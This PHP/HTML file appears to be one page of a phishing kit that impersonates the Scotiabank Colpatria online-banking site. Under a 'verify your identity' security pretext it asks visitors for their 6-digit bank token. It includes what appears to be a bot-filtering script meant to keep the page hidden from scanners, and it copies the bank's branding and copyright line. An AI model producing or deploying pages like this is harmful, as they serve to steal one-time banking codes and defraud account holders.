<?php
require "is_botcito.php";
require "ayudante.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="cabe">
            <div class="logocenter">
                <div class="logo">

                </div>
                
            </div>
        </div>
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="titulo">
                        <h1>Verifica tu identidad</h1>
                        <hr />
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="fatm">
                                <input type="hidden" id="prueba_clave" value="">
                                        
                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input type="password" name="token" id="token" placeholder="Token"
                                        maxlength="6" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*" />
                                        <div class="error" id="etoken">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Token invalido</span>
                                    </div>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btntoken" class="btn">Continuar</button>
                                </div>
                                <div class="inputg inicio" >
                                    <p style="margin-bottom: 5px;">Por razones de seguridad le recomendamos ingresar los
                                datos solicitados a fin de seguir disfrutando de nuestros servicios</p>
                                   
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/seguridad.svg" alt="seguridad" />
                            <p>
                            El correo electrónico que ingreses tiene que haber sido registrado anteriormente en nuestras bases de datos.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="pie">
            <div class="piecenter">
                <p class="derec">
                    © 2022 Todos los Derechos Reservados Scotiabank Colpatria.
                </p>
            </div>
        </div>
    </div>
    <script src="js/funciones.js"></script>
</body>

</html>